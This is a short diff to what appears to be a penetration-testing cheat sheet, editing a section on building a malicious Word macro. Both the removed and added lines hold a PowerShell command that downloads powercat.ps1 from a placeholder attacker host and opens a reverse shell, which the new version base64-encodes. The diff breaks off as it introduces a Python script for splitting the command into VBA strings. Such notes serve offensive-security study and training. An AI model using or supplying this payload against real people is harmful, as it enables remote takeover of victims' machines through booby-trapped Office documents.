@@ -2928,7 +2928,12 @@ In evil.hta, the code will find the following command ::> `powershell.exe -nop -
 
 **Microsoft Word Macro**: To exploit Microsoft Office we need to creare a doc in `.docm` or `.doc` format and use macros. An example of the creation of a macro to run a reverse shell is the following.
 
-1. `echo "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell" | base64`
+1. From your powershell, prepare the command encoded in base64
+   ```
+   $TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell"
+   $ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXT))
+   echo $ENCODED
+   ```
 2. Since VBA has a 255-character limit for literal strings, we have to split the command into multiple lines. You can do it with the following python script:
    ```python
    import sys
